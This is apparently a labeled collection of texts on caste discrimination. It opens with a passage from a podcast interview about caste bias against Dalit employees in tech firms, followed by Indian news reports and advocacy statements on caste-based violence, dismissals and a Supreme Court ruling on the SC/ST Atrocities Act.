it or nobody feels that they are doing anything wrong travels across institutes and then further it spreads to the companies that they get into. And from companies it travels to different countries. In the US too they come with this mentality that that government has done a big favor by providing scheduled castes’ and tribe’s reservation in the constitution. And their story ends there. So now a Dalit has to fight his way out. Thenmozhi: If I can jump in here because I think it is very clear that there is a deep level of pain that our communities face when they go into such deeply casteist institutes. And it is very clear from the things that you are sharing with us that it is systemic. There are no checks and balances. Dalits who persevered through this very violent environment, had probably hoped that after leaving casteist schools that they would enter workplaces that were less casteist. But what we are finding, particularly with the CISCO lawsuit, is that these workplaces are also deeply casteist. And I am wondering if you could speak a little bit, I know it is painful, about the nature of challenges caste oppressed employees face in hostile tech workplaces. Sam: That’s a very good question. The CISCO case that you mentioned surprised us all. The case was not filed by the company itself but the employee with help of the organisation that looks into these matters filed the case. Which means it took some time for the employee to bring the matter to light. If you look at the US particularly, 99 percent of non-Indian don't know what caste is. It is surprising because they have been employing millions of Indians for more than 20+ years, and they still don't know what caste is. And it's not just employees or citizens but even companies are not aware. Thenmozhi: I mean Sam, let’s just be clear, there is a failure of duty of care by these companies to hire, work and serve huge populations of South Asians and for them to not have the basic competency related to caste. That’s a failure on them and they are going to be taken to task about it. And this lawsuit is really just the tip of the iceberg around it. But again I think that knowingly they have hired hundreds of thousands of Indians into their workplaces but their HR departments don’t have caste as a protective category. Their HR, Diversity and Inclusion team members don’t understand caste. Which has created a situation where there is a lot of caste based discrimination at the workplace. And so I am just wondering, knowing these tense situations, particularly what have you experienced? If you could speak to some of the ways in which Dalits have to hide their identity and things like a Tam-Brahm pact. What are some of the conditions that get created for Dalits in the workplace? Sam: I have worked for top MNCs, who have offices both in India and outside. Their HR documents mention that you cannot discriminate against employees based on their race, gender or country of origin. The HR policy in India, too, doesn’t mention that you cannot discriminate based on caste. When I approached the HR regarding this situation, they mentioned they did it to ensure consistency across HR policies in different countries. So one would think that then you should mention caste-based discrimination in your HR policy wherever you are employing Indians. Wherever Indians go, their caste goes with them. So even in the CISCO case, they have been taking this protection that in their HR policy caste-based discrimination is not mentioned. Again, when I came to the US for the first time in my early 20s, at that time, there were groups that were brought from premier institutes to the US. They have their own networks. Sometimes there is no easy way of identifying someone’s caste. Even though in the majority of the cases you can tell if someone is a category student or not by their surname but in a few cases it is difficult. In those special cases, other ways are employed to find out your caste. They would call you to different pujas and based on your reaction, they would try to guess your caste. If you say you are not interested in pujas, that gives it away. They would ask questions like are you vegetarian and if you say yes I am vegetarian, they will ask are you vegetarian by birth or by choice. So they try to find out your caste in one way or the other. If you are a male adult, they would call you for a ceremony called Rasvim or they will pat your back to find out if you are wearing the white thread or not. The white thread is worn by upper castes, primarily Brahmins. So if you are not wearing a white thread, they would know that you are not from an upper caste group. They are very connected in their groups and in MNCs, everything is driven by networks. If one person knows that you are not an upper-caste man before I even drive and reach my home in one hour the message has reached the entire network. Now, because US folks are not aware of caste, there are no checks and balances to prevent discrimination. One of the ways in which I got impacted was that in all MNCs there is an appraisal system that happens every year. Now if you ask anyone working in an MNC, they will tell you that appraisals are a big thing and that everybody works their butt off to get a good appraisal rating that defines everything. Your salary increments are decided by your appraisal ratings and your promotion is based on your appraisal rating. Your progression is defined by your salary ratings. If you are off-shore in India, whether you can travel on-site or not is determined by that appraisal rating. So when I came here to the US, we had a meeting with a client who was very eager to know about caste. He said that he had been reading a lot about caste in India and found out that it was a big challenge in India, so he asked: “You guys are here in the US, what is your take on caste?” So my upper-caste bosses - mostly in all MNCs if they are headed by Indians, the top positions are occupied by upper castes, you would rarely find a Dalit - in that meeting, my boss, as has been the tradition since the time we graduated from premier institutes, so they still feel that caste system is not a bad thing. He started saying in the meeting to the client: “Look in the olden days there was this great thing called the caste system. Society was divided, the Brahmins were like the managers and they used to strategise, below them are Kshtrayis who protected society from outside attack. After them, there were Vaishyas who were looking at all money matters and finally, there was the Shudra who provided their services to all the classes. So it was a wonderful system. It was after the British came that divisions started to fester in the country. If given a choice I would like to go back to the old India when we were called Golden India.” After listening for two or three minutes, I could not take it, and I jumped in and said, “look, because you are a Brahmin or an upper-caste person you may like it but if you ask any lower-caste person they would call the caste system monstrous. Caste has ruined everything they have got, including their human dignity. They have been discriminated against and they have not been given access to education, they were not given access to money, making jobs, they were not given access to the UN. If you take any newspaper, even today, Dalits are facing atrocities and rapes in the name of caste. And these atrocities have been recognised by the constitution of India. There are very strong laws against caste-based discrimination and a lot of work is happening to annihilate caste. So if you think caste is good, then it is only good for the top 3 percent or 5 percent but not for the entire society. So that's my take.” Suddenly everybody got silent. They couldn’t understand why I would say that. In one sense, they felt that probably I am lowering the status of India. When I spoke against casteism they thought I was talking against India. The upper caste bosses, in their looks, I could feel basically they got hurt because they think the caste system is their heritage and great tradition in which I am trying to find faults in and giving the wrong impression to a non-Indian. In reality, they still think that caste is good for society so anyone talking against the caste system is a no-no to them. After that meeting within a month there was an appraisal - and as I had mentioned your appraisal drives everything - and even though nothing about my work had changed from the previous year when I got the highest rating. I was engaging with the same clients and the same level of delivery yet my rank fell two-levels below the rank I had received in the previous year. I could not understand this, and so I reached out to some people because the ratings are not given by only one person but a set of people together and they discuss. I asked on such person who participated in the ranking and asked him what had happened, he told me that I didn’t deserve the rank which I got but a few people in the office insisted that my rank be brought down. These were some people who were there with me in the meeting where I had spoken out against the caste system. After the rating fell down, I was told that I might be asked to leave the US and move offshore in India where I was needed more. So literally I can see there was no other reason for this decision besides me coming out so strongly against the caste system and exposing myself to caste bias. Because of my degree and experience, I did not have a problem getting another job in India. So I moved to India for three months but there were people who said why didn’t you complain but it is very difficult because it was a hunch, I cannot prove anything. I could have filed a complaint on the ground that despite good performance I was given a lower ranking but the caste angle would have been difficult to prove. Eventually, I left the job in India because I got a job offer from the US and I had to move back to the US for my children’s education. But yes, that is one instance where it clearly came out how caste could impact. Thenmozhi: This is so great Sam that you were brave enough to stand up to this nonsense, particularly, because it is such a dominant caste point of view, to see from a place of privilege, that caste bring stability. But of course for those of us who are caste oppressed, that stability for the privileged is bought at the cost of our community’s lives. I have heard so many people in the diaspora make this argument and it is tone-deaf and violent. Can you imagine people justifying another system of violence like slavery or apartheid simply for its stability? It's so offensive. I also want to ask Sam, how difficult was it to even think about going to HR? As in, what is the general difficulty our people have when reporting caste discrimination in tech workspaces? And I am wondering if you could even go into what your own consideration was in deciding not to report? Sam: That is a very good point which you have brought. A factor that people generally don’t acknowledge is immigration status. For somebody who is on a work visa here, especially those who have their kids in schools. In this situation, it is not about me making money or not, it's like the kids who have done all their education here suddenly they have to shift to the education in India where you have to study the regional language and the system of education is very different. In India, you have to mug things and write and here you are trained to do things instead. So it becomes very difficult for the children to adjust. This was also the biggest consideration as a parent when a company suddenly asks you to move back to India. So that was the biggest thing on my mind. Therefore, keeping my children in mind, I had to think about how to come back as soon as possible. H1 visa lets you work in the US for six years in case you have filed for a green card, and if you have a green card then you can stay as long as you want. The biggest thing on my mind at that time was that my company had to apply for my green card, that is what I was promised when I came to the US. So the biggest concern on my mind when I had to leave my previous company was this because I thought I would be in the US until at least my kids’ education finishes. But for me my kids were in middle school and high school, and so it was of critical importance that the kids’ education does not get impacted. Fortunately for me, I applied to a US-based company and I came back. In case I went to HR, they would have probably probed the case from the angle that despite doing well, I was given poor ranking. They would have not looked from the caste point of view as I had mentioned earlier in the HR policy, they don’t recognise caste-based discrimination. Secondly, I could not have proved with evidence that what happened was as a result of caste, which would have become very difficult for me. If I fought the case, I would have probably been able to increase my rating by one level, based on my performance. But fighting the case from a caste angle, it would have been almost impossible, especially in the US. Even in India it is difficult, I have not heard of a CISCO-like case in any MNC in India. First, caste-based discrimination is not mentioned in HR policies in India. If someone manages to file a complaint against caste discrimination they would find it difficult to prove, even if he manages to prove they would try to close it at the company HR level itself. As we frequently read in Indian newspapers that if a Dalit person filed against rape, the accused seldom goes to jail but the person who complains is put in jail. The same could have happened here. In case I filed a complaint against caste-based discrimination, probably the guy I complained against might get a promotion while I may get a demotion or my career maybe even go for a toss if I am exposed. So that is another fear. Thenmozhi: Sam, I think this is so important that again, even the category of the H1B visa was actually created to prevent organising for a just workplace within tech. So the H1B visa creates a very particular condition where even if you are motivated and are a powerful activist like you are Sam, the reality is because of tension in your workplace, you are not just threatened of losing a job, you are actually also having to deal with the threat of losing your immigration status. That really is a cost too heavy for many Dalits and other caste oppressed Americans to bear because, again, like you said, many people in our community are first-generation earners, we are the first generation immigrants into the United States. And we are not just representing ourselves but we are actually supporting an entire network of families. That pressure and tension is a lot to bear. That is also why we have heard from many, many Dalits since the CISCO case came out Equality Labs has got over 250 rapid responses, emergency complaints from people who were saying they cannot raise this issue at their workplace. We want to be able to have our stories told. I think the CISCO case is really the tip of the iceberg because of how bad the conditions are and Dalits can speak out and we are determined to basically flank the CISCO case to make sure that John Doe gets his time in court. But we also want to be clear that it is not our job to solve hostile workplaces; it is the duty of care of these companies. You have to really look at that fact when you are looking at companies like Facebook, Twitter and Google these are corporations that not only employ hundreds of thousands of Indians both in India and in the US but they also are desperately clawing their way to try to dominate the Indian and South Asian market, because keep in mind one in four people in the world are South Asian, one in six are Indian. So everything about the future of profits of these companies are based upon how well they do in our markets. If they cannot do the very basic diligence they need to do to protect caste-oppressed employees and caste oppressed users of their companies’ products, well, they are going to reap the whirlwind, because Dalits are not going to stay silent while they create oppressive content that dominates their platform, and create conditions that are violent for our people on the inside. Everything you have said Sam, anyone, any person who has consciously listened to your story, their blood is going to boil. You should not have to take casteist language from someone who is your supervisor. You shouldn’t have to worry about getting demoted or getting challenged on the work front simply because you are telling the facts and they are telling their caste bigotry, then they are shaming you for so-called shaming India. They themselves should carry the burden of this shame because it's not the burden of Dalits to talk and break the silence about this issue anymore. It's now time for people who are benefiting from these networks of privilege to really take on this problem and take it on wholeheartedly because, to be honest, when caste exists at this level, everyone suffers. We need to do better as a society because we are facing so many different problems collectively. Anytime we diminish such a huge group of people the way that we diminish caste oppressed peoples, we are losing one of the most powerful resources that we have, which is each other. It is really time to put an end to and annihilate caste just like Dr. Ambedkar did. We are coming to the end of this podcast but Sam I want you to give the last words. You are such an incredible role model for many Dalits in diaspora both in terms of your activism, your technical prowess, but also your role as an inspiring father. I am wondering for our listeners out there what the last request you have in terms of people working together to stop this problem. Sam: This issue is close to my heart. I am doing what I can do in my limited capacity. In the professional environment I have to be careful, and avoid sounding pro-Ambedkar or pro any of our other icons as doing so might hurt me professionally. First thing I would advise anybody who is doing activism to go among the people but in the professional environment, I think people on the top, the upper castes, are still not so progressive that they will understand where you are coming from. They may think you are attacking their traditions. So I would say the best thing you can do in the professional environment is be the best. If you become the best at what you are doing your company cannot leave you. So just be your best and then go and educate the masses. Go outside your professional environment and do ten times more than what you are doing now. There are very few people, probably 100,000 people, at the top jobs so if one Dalit loses his job more than the person and his family, the community gets impacted. Keep the bigger picture in mind. To my upper caste friends, I would say you have to be understanding that if you are not going for annihilation of caste, you are doing harm to yourselves also, and definitely to the country. The whole country is going to lose if you think that caste is not a big problem and if you restrict your understanding of caste to only reservation. If you end the reservation, the caste system will end. Caste system is the root disease and not reservation. Reservation is only the medicine that was brought in to cure the disease or annihilate the caste at a certain point. We have to work together to make a caste-free India and a caste-free world. You might have to do a little more to annihilate caste from this world sooner than later. We are not asking for favors, we are asking for what any human being deserves which is a society where the checks and balances are put in such a way that there is no way that people can discriminate on the basis of caste. Give value to the work we are doing. Give us a workplace that is safe from caste-based discrimination. Look at our diversity proportion and reflect if this diversity is reflected in all fields. Just like today we are thinking about gender representation we also have to think about caste representation. Dalits comprise 15 percent of the population, OBCs are 52 percent of our population and scheduled tribes make up 8 percent of the population, is this diversity reflected in your bodies? Even though Brahmins in our country are a numerical minority they occupy 90 percent of all sea- shoot (ph) positions. Corporations which only focus on the stories of upper caste Indians and refuse to encourage participation from larger society, you will not capture the Indian market as you will miss 90 percent of the population. They need to stop looking at India from the lens of Brahmins and start looking at the country through the lens of those who comprise 90 percent of this country’s population. Organisations must ask themselves if they are approaching the Indian market with a team that is truly diverse. And my Jai Bhim salute to you. Mari, Thenmozhi and you guys are doing such a wonderful job, and the whole of your team. My best wishes to you. Thank you so much for giving me this opportunity. Thank you! Thenmozhi: No, absolutely Sam. I mean, the thing is, we are all in this together. We are all here as Dalit in the diaspora holding the line and the only thing that I would add to Sam’s wonderful comments is that what’s really important, is that too often dominant caste people act as if Dalits are coming with a begging bowl when we are asking for our rights. And I just want to make it clear to people that we are not asking for anything. We just want you guys to stop acting out of privilege. Stop exploiting and stop discriminating against us and behave as proper human beings. The reality is that we have to take structural measures to ensure our equity because of how powerful, complicit and unbearable caste hegemony is in all these institutions. Sam shared a testimony of how a young woman from our community set fire to herself in a casteist educational institution. If the conditions are this bad, we need to do something differently as a society and that is really the call to action we had hoped to inspire with the Caste in the United States survey. I think with the CISCO case, we have such a huge opportunity in the United States to really lead the front of this conversation in a market where dominant castes are not in power. One thing that I have said interview after interview is that we need to credit the State of California for doing something that the Indian government has not done for decades, which is to ensure and have a very public debate about question of caste discrimination in workplaces and other American institutions. So if the CISCO case continues and there is a win, it will be a win not just for John Doe but it will be a critical step towards adding caste as a protective category which we need in all of American institutions. Then also a call for action for all these corporations to begin to build their caste competency. They can start by training HR departments and managers, what caste is and how to spot caste discrimination and to basically move forward to creating inter-caste work places with equity. Some of the stuff that Sam mentioned, which includes stopping the violence - which doesn’t go far enough when we know these companies have done very deep investments for diversity and inclusion measures that also include scholarships, coaching and pathways of progress for those who are from other minority backgrounds. At this point we need to see those same investments for caste oppressed people because the time is now. And as Sam said, this is also proper business sense because if you want to capture the next billion users, the next billion users in South Asia are actually caste oppressed. So it is best to actually have caste oppressed technologists to shape that agenda, to be able to drive collaborations with our community so that we can wise all boats. I leave folks with these thoughts. I want to thank everyone for participating. Sam, thank you again for joining us and all our listeners for tuning in. We hope to see you in our next episode and until then, Jai Bhim.

1,"The Gujarat chapter of Bharatiya Dalit Panther has sought an apology from Deputy Chief Minister Nitin Patel over an “objectionable” word he used during an election meeting in Morbi district on October 30, while describing legendary Gujarati film personalities Mahesh Kanodia and Naresh Kanodia who died recently. The organisation has threatened to burn Patel’s effigies across the state if he does not tender an apology by Tuesday 6 pm. Patel made the controversial speech on October 30, at Vaghpur (Piludi) village in Morbi assembly constituency, while campaigning for party candidate Brijesh Merja in the by-election, polling for which is scheduled Tuesday. The Deputy CM referred to PM Modi’s tour to Gujarat adding that the latter had first visited the residence of former CM Keshubhai Patel and the Kanodia brothers who died recently, for which he used an “objectionable” term. Dalits from different parts of the state have strongly condemned the term used by the Deputy CM for Kanodias. The Kanodias were BJP members; Mahesh was a former BJP MP and Naresh was a former BJP MLA from Gujarat. General Secretary of Bharatiya Dalit Panther, Rahul Parmar, said, “By using prohibited word for honourable Mahesh Kanodia and Naresh Kanodia at a public meeting, Deputy CM Nitin Patel has insulted the two deceased personalities and the entire Dalit community.” “We have issued a warning to Deputy Chief Minister Nitin Patel to apologise for the word used by him within 24 hours. If he does not apologise, then his effigies will be burnt across the state on Tuesday evening. Also, opposition will be registered at all his (Patel’s) future public functions till he tenders an apology,” he added. Nitin Patel could not be contacted despite repeated attempts. 📣 The Indian Express is now on Telegram.

1,"Raj Kumar Singh was discharged from duty in June on disciplinary grounds. Video Editor: Ashutosh BhardwajVideo Producer: Maaz Hasan I, Raj Kumar Singh, was sacked from the post of Assistant Professor at Bundelkhand University just because I went for training at IIT Guwahati. I was discharged from continuing my duty in June on disciplinary grounds. The NASSCOM (National Association of Software and Service Companies) training program that I took was intended to train the teacher in advanced technology, like machine learning, robotics, artificial intelligence et al. Despite getting my leaves sanctioned and arranging the lectures to be given in my absence, from 2 to 14 March, I was served with a show-cause notice on 17 March and my salary was deducted. There were two other professors from the university who attended the NASSCOM training, but they weren’t dealt with in the way I was. On 23 June, order to disengage me from my services was passed and a signed copy was given to me by Prof SK Katiyar. I wrote letter after letter to everyone, from the governor to chief minister and the education minister. When their offices sought a report on the matter, they (University) always submitted a false reply. With no options left, I moved to the Allahabad High Court for justice. My family and I are being harassed, both mentally and financially. I have not been paid for five months. The Allahabad High Court ruled in the favour of Singh. The court, in its order, said, “this is not a case of such a misconduct or disobedience which can warrant the maximum punishment of termination of service and, accordingly, the resolution of the Board of Governor dated 16 June 2020 and consequential order dated 23 June 2020 are hereby set aside.” However, the two-year contract of Singh expired on 30 September and the court verdict doesn’t bind the university to renew Raj’s contract. When The Quint reached out to Professor Katiyar, he said that Singh’s leaves had not been sanctioned. However, the university admits to extending contracts of other employees. “His contract expired on 30 September. People working before that were given an extension to teach temporarily. Their names would be nominated in the meeting of the Board of Governors and later, would be confirmed.” Professor Katiyar said.

1,"eShe the female gaze eShe is a monthly magazine and blog based in India and Canada that amplifies women’s voices and stories about our shared humanity. A chilling new report by Swabhiman Society and Equality Now highlights how India's justice system is failing survivors of caste-based sexual violence. Even as India reels from the news of the Hathras gang-rape this September, a chilling report produced by Swabhiman Society, a grassroots organisation led by Dalit women, in collaboration with international women’s rights organisation Equality Now, has found conclusive evidence of how India’s justice system is failing survivors of caste-based sexual violence. The report titled Justice Denied: Sexual Violence & Intersectional Discrimination – Barriers to Accessing Justice for Dalit Women and Girls in Haryana, India examines 40 rape cases involving women and girls from the Dalit community in India’s northern state of Haryana. It finds that not only are these women and girls more vulnerable to heinous forms of sexual violence – such as gang-rape and murder – than women from other communities, they are also less likely to get justice due to systemic prejudice, patriarchy and corruption. According to government data, around 10 Dalit women and girls are raped daily across India. However, the real figure is estimated to be far higher. “The stories featured in our report are horrific and heartbreaking, all the more so because of how the criminal justice system largely fails to act,” Jacqui Hunt, director of Equality Now’s Eurasia office, tells eShe. “Perpetrators of sexual violence and abuse know they are far less likely to face punishment if they commit a crime against a Dalit woman or girl because attacks are rarely investigated or prosecuted and conviction rates remain abysmally low. Society, law enforcement, and India’s unofficial justice system of village councils, called panchayats, all conspire to obstruct justice and rally in support of men who stand accused, particularly if they are from a dominant caste,” she avers. In over 80 percent of the cases in the study, all the accused persons involved in the case were from a dominant caste, and in over 90 percent of cases, at least one of the accused persons was from a dominant caste. Perpetrators often acted in groups and attacks tended to incorporate more severe forms of sexual violence, including gang-rape and murder, when it came to Dalit women and girls. In 97 percent of cases in Haryana, the offender was known to the victim. The highest number of victims came from the age group of 13 to 17 years old. Only 10 percent of cases examined ended with the successful conviction of all those charged, and this was just with particularly abhorrent crimes involving a victim who was murdered or under age six. Out of the 40 cases in the study, 62.5 percent are gang-rape cases, which is significantly higher than the 11-12 percent of gang-rapes in rape cases involving all women and girls in Haryana. “The high percentage of gang-rapes indicates how sexual violence against Dalit women and girls takes the form of a collective exercise of power and authority by dominant caste members,” says the report, work on which began in March 2020. Echoing the events of the Hathras gang-rape case – where the Uttar Pradesh police burned the 19-year-old victim’s body without her parents’ consent or knowledge after she was reportedly gang-raped and murdered by four upper-caste men known to her – the report has also found that police frequently failed to record or investigate crimes when initially reported and were sometimes abusive or put pressure on survivors to drop cases. “The horrific gang-rape and death of a young Dalit woman in Hathras in September once again demonstrates the close relationship between sexual violence and India’s discriminatory caste system. Extreme instances of sexual violence and cruelty, such as the Hathras victim was subjected to, draw extensive media coverage and outrage in India. Meanwhile, there is little indication that real action is taken to address the common impunity for such crimes, nor to achieve positive, systemic change that ensures prevention of sexual violence and caste-based discrimination, and gives survivors access to justice,” says Hunt. Around 42 percent of rape cases in Haryana are dropped during the police investigation itself without charges being filed (compared with the national average of 15 percent rape cases being dropped). One of the reasons is that “due to pressure from high-level politicians to clamp down on caste-based atrocities within the state, district-level authorities aim to bring down the number of rape cases registered under the Scheduled Castes & Scheduled Tribes (POA) Act,” says the report. This leaves the survivor with no access to the criminal justice system. Manisha Mashaal, who founded Swabhiman Society in 2012 to provide paralegal support and legal aid to survivors of sexual violence from marginalised communities, states: “One of the biggest challenges in cases of sexual violence is that survivors or the families are pressured into compromises with the accused. Another issue is the lack of quality and effective systems in place to provide the survivors of violence and their families with immediate social, legal and mental health support along with proper and timely rehabilitation.” Survivors in the study were not given adequate advice about their legal rights, and some did not receive compensation payments they were entitled to from the government. In fact, compensation was received by the rape victims only in seven out of the 37 cases in this study in which a police complaint had been filed, of which four were after either public outcry or court orders. Compensation was not received in 62 percent of the cases, while data is unknown for 18 percent of the cases. Survivors, family members, and witnesses also faced threats, coercion, and bribery from perpetrators and members of the wider community seeking to stop prosecutions. In over 80 percent of the cases, village councils attempted to interfere with the justice process by using their economic, social and political power to threaten, intimidate and coerce survivors and family members. In almost 60 percent of cases, the survivor or her family was pressured into withdrawing from pursuing a legal case and had to accept a ‘compromise’ settlement outside the legal system. “In one case, a Dalit woman was raped by three dominant caste men including the Sarpanch (head) of the village. When the survivor went to the police station to register a FIR, she was threatened with sexual and physical assault in the police station itself by the perpetrators, and the Sarpanch threatened to banish her from the village if she pursued the complaint,” says the report. In 32.5 percent of the cases, the survivor and sometimes her family were forced to leave the village or neighbourhood due to the stigma surrounding the rape incident and/or community pressure. Hunt calls on India’s government and criminal justice system “to take positive action to effectively address the epidemic of sexual and gender-based violence being inflicted on marginalised women and girls” in India. Mashaal adds: “It is critical that the barriers to justice faced by Dalit women and girls at the ground level are brought to the attention of our society and government so that caste-based violence is recognised, space is created for Dalit voices to be heard, and collective action is taken towards ensuring justice to the survivors and their families.” Photos: Swabhiman Society and Equality Now Syndicated to Money Control Community manager, eShe, and visual artist.

1,"The Sundakadampalayam panchayat president has been accused of having had a role in the abuse, which included dragging the man to the police station with allegations of sexual harassment. Published: 17th November 2020 12:23 AM | Last Updated: 17th November 2020 12:25 AM | A+A A- M Kumar (36) is the only Dalit in a neighbourhood full of families from a dominant caste. (Photo | Express) TIRUPUR: In a shocking incident, a Dalit man residing in Uthukuli has alleged that he has been forced out of his village by his dominant caste neighbours. The Sundakadampalayam panchayat president has been accused of having had a role in the abuse, which included dragging the man to the police station with allegations of sexual harassment. M Kumar (36) is the only Dalit in a neighbourhood full of families from a dominant caste. The number had, however, not always been skewed against him. When he bought this 2.25 cents of land in Guruvayurappan Nagar from one Kousalya in 2013, there were mere five houses in the area. ""I was born and raised in Urumandapalayam near Kovundampalayam (near Coimbatore city). I was working as a construction worker for several years and then moved to the cattle business. Meanwhile, I decided to build a house in Uthukuli. I spent over Rs 1.5 lakh and built a small house,"" he recounts. Now, in a neighbourhood of over 100 families, Kumar was excluded from all social activities and pursuits. Matters came to a head when plans were drawn up for a Ganapathy Temple in the locality in 2017. While the neighbours pooled money for the construction, he was left out. ""When I questioned them, they claimed that it was because I do not belong to their caste. When I reported the incident to the then panchayat president, Rasathi, she stepped in and asked the neighbourhood group to include me in the proceedings. They refused to comply. So, she refused to give them permission to carry out the temple construction. This angered the group and led to them raising false allegations against me,"" claims Kumar. Since then, he's been subjected to casteist slurs, with people reportedly claiming that Dalits should not reside in the village and certainly not in their locality. On November 8, Kumar says that a group of people headed by Sundakadampalayam panchayat president Anand barged into his house, hurling casteist slurs and thrashed him and his 65-year-old mother Papal. ""They took me to Kunnathur police station and accused me of sexual crimes, saying that a person of such conduct cannot be a resident of the village. Even as I was at the station, they hired two vans and vacated my house of my belongings, my goats and cows, and my two bikes. The police personnel, too, threatened me, forced me in the van with my belongings and sent me to my brother's house outside the village (2.5 km away),"" he narrates. While he has submitted a petition at the district police headquarters, no action has been taken, he claims. Tirupur Collector K Vijaya Karthikeyan told The New Indian Express that he has instructed the police to conduct an inquiry into the incident and assured that action will be taken immediately. District Police Superintendent Disha Mittal, on her part, reiterated that this was a serious issue and said the case has been transferred to Kunnathur police station under a team headed by Deputy Superintendent of Police L Baskar.

1,"He was then arrested on false charges after his 'upper caste' assailants claimed that the Dalit boy had beaten them up. But the pictures and the caste dynamics clearly have a different story to tell  CJP moved the National Human Rights Commission (NHRC) on the issue of caste based violence in a small village of Uttar Pradesh where a young Dalit boy was beaten up by 'upper caste' men. This complaint has been redirected and transferred by the NHRC to the Uttar Pradesh Human Rights Commission (UPHRC) for consideration and necessary action. The complaint dated August 27, 2020 was placed before the Commission on November 6, 2020 and it was deemed by the NHRC that the subject matter of the complaint should be dealt with by the state’s Human Rights Commission. Accordingly, a scanned copy of the complaint has been forwarded to UPHRC on November 6, 2020. The incident occurred in Kunwarpur village, Bulandshahr district, Uttar Pradesh whereby a Dalit boy was brutally beaten up by 'upper caste' men for calling the mobile phone of one of the 'upper caste' men. The victim, Vishal called the mobile phone of Dipu Sharma, on July 9, to ask when he would come to pick up the Bajra crop when the call was answered by Dipu’s wife and she informed Vishal that Dipu was not at home and the conversation ended. The same night around 10 PM Dipu, along with his brothers, Mukesh and Mohit and two others, Sachin and Prashant came to the victim’s house, and started hurling casteist abuses at him while asking why he had called and spoken to Dipu’s wife. Then they brutally beat him up black and blue with rods, sticks and cable wires so much so that his skin has peeled off. Dipu and others even threatened him that they would kill him.  Vishal, belonging to Chamaar community managed to file an FIR against the 'upper caste' men, but no arrests were made by the police. On the contrary, the accused men filed an FIR against Vishal falsely stating that he would speak obscene words over the phone to the accused’s wife and even beat up the upper caste men, for which Vishal was even arrested. The complaint points out the absurdity of the allegations being made by the upper caste men, “It is extremely pertinent to note here that Dipu belongs to an upper caste and a Dalit entering a Brahmin’s house and beating up family members has never been heard of; it is rather preposterous and unthinkable that such an incident should happen in the Indian society where caste is given such high regard and the divide so deep rooted.” The complaint further states, “The Dalit family is being intimidated by the upper castes and the police are also reluctant in taking action against the perpetrators belonging to upper caste who enjoy the support of other Brahmins of the villager including the Gram Pradhan.” In the light of the stark caste divide and caste hegemony prevalent in rural India that has come to the fore in the treatment of the family of the Hathras rape victim, it has become of utmost importance that the UPHRC take serious cognisance of this incident and bring justice to the Dalit youth, who after having suffered injuries had to also undergo incarceration.

1,"(Samaj Weekly) The Hon’ble Supreme Court, in the matter of Hitesh Verma vs State of Uttarakhand (criminal Appeal no. 707 of 2020), passed its judgment stating that “Insulting or intimidating a person belonging to Scheduled Caste or Scheduled Tribe (SC/ST) community will not be counted as offence under the SC/ST PoA Act unless such insult or intimidation is on account of victim belonging to SC/ST community”. National Coalition for Strengthening SCs & STs PoA Act and National Dalit Movement for Justice- NCDHR strongly condemns the judgement delivered by the Hon’ble Supreme Court in the above mentioned case as it weakens the roots of fight against untouchability. We would like to further reiterate that the Scheduled Castes (SCs) and the Scheduled Tribes (STs) (Prevention of Atrocities) Act, 1989 was framed to prevent atrocities committed against the Dalit and Adivasi communities. The research data from various source reveals that the “Act” has not been properly implemented. Still there is a large fragment of people belonging to the marginalised community for whom ensuring access to justice is still remains a dream. In most of the cases, people belonging to Dalit or Adivasi community do not even report the due to fear of social boycott or other form of atrocity by the dominant castes. The PoA Act is intended to serve and protect the rights of Dalit and Adivasi’s. However it has been observed that a number of attempts have been made to dilute its provisions. The judgment delivered in the above mentioned criminal appeal is one such attempt. The judgment will form the base of gross social injustice to the marginalised and vulnerable communities. It is only due to the constant struggle of few civil society organisation and Dalit and Adivasi leaders, the act is still into existence. As per the facts of the case, A Dalit man raised his voice against forceful and illegal land possession by the dominant caste members. The Dalit man and his family members were constantly being threatened and subjected to atrocity. The FIR was lodged for the offences under Sections 452, 504, 506 of Indian Penal Code and Section 3(1)(r) and 3(1)(e) of the Scheduled Castes and Scheduled Tribes (Prevention of Atrocities) Act, 1989. The police filed its report of investigation and removed Section 3(1)(e) from the charge sheet. The accused later filed an application under Section 482 of Criminal Procedure Code for quashing of FIR.The appeal made by the accused came before the apex court and the Hon’ble court, while quashing the FIR, reiterated that “This act intended to punish the acts of the upper caste” and this case had no connection with the caste (Scheduled Caste) of the complainant. Both the complainant and the accused person have the right to own the land and get justice. Since the incident occurred within four walls in the absence of members of the public, the allegation under the act do not stand and hence the section 3 (1) (r) cannot be applicable to this case as highlighted in his judgment. The Hon’ble Court has ignored few of the most important legal aspects while delivering the judgment. The same are as follows: 1. The police authorities, at the initial phase of the investigation, had failed to invoke sections 3 (1) (u) and 3 (2) (va) of SC/ST Act 1989 in the said FIR. The facts of the case clearly attract these provisions. In particular, when the FIR is registered under IPC sections, the police authorities are also bound to include section 3 (2) (va) of SC/ST PoA Act. Moreover since the FIR is registered under 506 of IPC, so it is obvious that section 3 (2) (va) of SC/ST PoA Act is applicable. But the Hon’ble Court did not consider these legalities of the case and rendered a judgment which is against the principle of Social Justice. 2. Moreover section 8 of the SC/ST PoA Act, 1989 talks about presumption as to offence. Sub Clause (c) of Section 8 further says that “the accused having personal knowledge of the victim or his family, the Court shall presume that the accused was aware of the caste or tribal identity of the victim, unless the contrary is proved”. The apex court has failed to look into this significant feature of the act. 3. Finally the Hon’ble court has ignored the basic principle set up under the Object and Reason clause of the act, i.e., the Act was enacted to improve the social economic conditions of the vulnerable sections of the society as they have been subjected to various offences such as indignities, humiliations and harassment. Even if a member of Schedule caste or Schedule Tribe is being verbally caste abused by the member of Dominant Caste, under the pretext of his caste identity, the act amounts to humiliation, harassment and violation of Article 21, i.e., Right to Life and Personal Dignity. Since, the Hon’ble court has failed to consider the above mentioned aspect and has grossly erred in rendering the said impugned judgment, National Dalit Movement for Justice would like to put forth following demands in order to prevent miscarriage of justice: 1. The Hon’ble apex Court shall reconsider the appeal by taking suo-moto cognizance and transfer the same to a constitutional bench for consideration 2. The State shall file a review petition in order to ensure that the victims have access to justice; 3. Action shall be taken against the concerned police authorities under the section 4 (wilful negligence) of the SC/ST PoA Act for including inappropriate sections and diluting the gravity of the incident and for favouring the accused person. We, on behalf of the National Coalition for Strengthening SCs & STs PoA Act (NCSPOA) will take every possible step to emphasizing upon our demands and to take action on reinstating the SC/ST PoA Act.

